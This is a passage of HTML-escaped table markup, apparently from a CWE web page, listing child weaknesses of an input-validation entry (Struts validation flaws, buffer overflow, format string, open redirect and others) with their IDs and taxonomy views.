Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;100&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=100" target="_blank"&gt;Technology-Specific Input Validation Problems&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;102&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=102" target="_blank"&gt;Struts: Duplicate Validation Forms&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;103&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=103" target="_blank"&gt;Struts: Incomplete validate() Method Definition&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;104&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=104" target="_blank"&gt;Struts: Form Bean Does Not Extend Validation Class&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;105&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=105" target="_blank"&gt;Struts: Form Field Without Validator&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;106&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=106" target="_blank"&gt;Struts: Plug-in Framework not in Use&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;107&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=107" target="_blank"&gt;Struts: Unused Validation Form&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;108&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=108" target="_blank"&gt;Struts: Unvalidated Action Form&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;109&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=109" target="_blank"&gt;Struts: Validator Turned Off&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;110&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=110" target="_blank"&gt;Struts: Validator Without Form Field&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;111&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=111" target="_blank"&gt;Direct Use of Unsafe JNI&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;112&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=112" target="_blank"&gt;Missing XML Validation&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;113&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=113" target="_blank"&gt;Failure to Sanitize CRLF Sequences in HTTP Headers ('HTTP Response Splitting')&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;114&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=114" target="_blank"&gt;Process Control&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;117&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=117" target="_blank"&gt;Improper Output Sanitization for Logs&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;119&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=119" target="_blank"&gt;Failure to Constrain Operations within the Bounds of a Memory Buffer&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts&lt;/span&gt;699&lt;/span&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;120&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=120" target="_blank"&gt;Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;129&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=129" target="_blank"&gt;Improper Validation of Array Index&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;134&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=134" target="_blank"&gt;Uncontrolled Format String&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;170&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=170" target="_blank"&gt;Improper Null Termination&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;190&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=190" target="_blank"&gt;Integer Overflow or Wraparound&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;466&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=466" target="_blank"&gt;Return of Pointer Value Outside of Expected Range&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;470&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=470" target="_blank"&gt;Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;554&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=554" target="_blank"&gt;ASP.NET Misconfiguration: Not Using Input Validation Framework&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;601&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=601" target="_blank"&gt;URL Redirection to Untrusted Site ('Open Redirect')&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;606&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=606" target="_blank"&gt;Unchecked Input for Loop Condition&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;621&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=621" target="_blank"&gt;Variable Extraction Error&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;622&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=622" target="_blank"&gt;Unvalidated Function Hook Arguments&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;626&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=626" target="_blank"&gt;Null Byte Interaction Error (Poison Null Byte)&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Compound Element: Chain&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;680&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=680" target="_blank"&gt;Integer Overflow to Buffer Overflow&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Compound Element: Chain&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;690&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=690" target="_blank"&gt;Unchecked Return Value to NULL Pointer Dereference&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" 